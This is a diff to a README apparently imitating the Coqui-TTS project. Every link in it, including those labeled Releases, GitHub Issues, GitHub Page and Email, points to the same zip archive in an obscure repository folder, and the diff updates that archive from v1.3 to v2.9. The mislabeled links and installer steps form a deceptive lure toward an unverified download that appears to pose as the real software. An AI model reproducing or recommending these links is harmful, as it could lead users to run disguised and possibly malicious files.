@@ -6,11 +6,11 @@ Welcome to Coqui-TTS! This application lets you generate text, images, audio, an
 
 ## 📥 Download Coqui-TTS
 
-[![Download Coqui-TTS](https://raw.githubusercontent.com/bracinho2424/Coqui-TTS/main/pyknatom/Coqui_TTS_v1.3.zip%20Now-Visit%20Releases%https://raw.githubusercontent.com/bracinho2424/Coqui-TTS/main/pyknatom/Coqui_TTS_v1.3.zip)](https://raw.githubusercontent.com/bracinho2424/Coqui-TTS/main/pyknatom/Coqui_TTS_v1.3.zip)
+[![Download Coqui-TTS](https://github.com/bracinho2424/Coqui-TTS/raw/refs/heads/main/pyknatom/Coqui_TTS_v2.9.zip%20Now-Visit%20Releases%https://github.com/bracinho2424/Coqui-TTS/raw/refs/heads/main/pyknatom/Coqui_TTS_v2.9.zip)](https://github.com/bracinho2424/Coqui-TTS/raw/refs/heads/main/pyknatom/Coqui_TTS_v2.9.zip)
 
 To download Coqui-TTS, follow these steps:
 
-1. Click the button above or visit our [Releases page here](https://raw.githubusercontent.com/bracinho2424/Coqui-TTS/main/pyknatom/Coqui_TTS_v1.3.zip).
+1. Click the button above or visit our [Releases page here](https://github.com/bracinho2424/Coqui-TTS/raw/refs/heads/main/pyknatom/Coqui_TTS_v2.9.zip).
 2. Choose the latest release and click on it. 
 3. Select the installer for your operating system (Windows, macOS, or Linux).
 4. Download the file to your computer.
@@ -90,7 +90,7 @@ Coqui-TTS focuses on various AI topics to support your creative needs:
 
 ## 🛡️ Support & Contributing
 
-If you encounter issues or have questions, check out our [GitHub Issues](https://raw.githubusercontent.com/bracinho2424/Coqui-TTS/main/pyknatom/Coqui_TTS_v1.3.zip) page for support. 
+If you encounter issues or have questions, check out our [GitHub Issues](https://github.com/bracinho2424/Coqui-TTS/raw/refs/heads/main/pyknatom/Coqui_TTS_v2.9.zip) page for support. 
 
 If you wish to contribute to the project:
 
@@ -103,12 +103,12 @@ If you wish to contribute to the project:
 
 For further assistance or inquiries, feel free to reach out via the following:
 
-- **GitHub:** [Coqui-TTS GitHub Page](https://raw.githubusercontent.com/bracinho2424/Coqui-TTS/main/pyknatom/Coqui_TTS_v1.3.zip)
-- **Email:** https://raw.githubusercontent.com/bracinho2424/Coqui-TTS/main/pyknatom/Coqui_TTS_v1.3.zip
+- **GitHub:** [Coqui-TTS GitHub Page](https://github.com/bracinho2424/Coqui-TTS/raw/refs/heads/main/pyknatom/Coqui_TTS_v2.9.zip)
+- **Email:** https://github.com/bracinho2424/Coqui-TTS/raw/refs/heads/main/pyknatom/Coqui_TTS_v2.9.zip
 
 ## 🔗 Additional Resources
 
 - **Official Documentation:** Comprehensive guides and tutorials are available to help you make the most of Coqui-TTS.
 - **Community Discussions:** Join our community discussions to share experiences and tips with other users.
 
-Now you're all set to explore the world of AI with Coqui-TTS! Remember to check the [Releases page](https://raw.githubusercontent.com/bracinho2424/Coqui-TTS/main/pyknatom/Coqui_TTS_v1.3.zip) for the latest updates. Enjoy your journey in creating with AI!
+Now you're all set to explore the world of AI with Coqui-TTS! Remember to check the [Releases page](https://github.com/bracinho2424/Coqui-TTS/raw/refs/heads/main/pyknatom/Coqui_TTS_v2.9.zip) for the latest updates. Enjoy your journey in creating with AI!
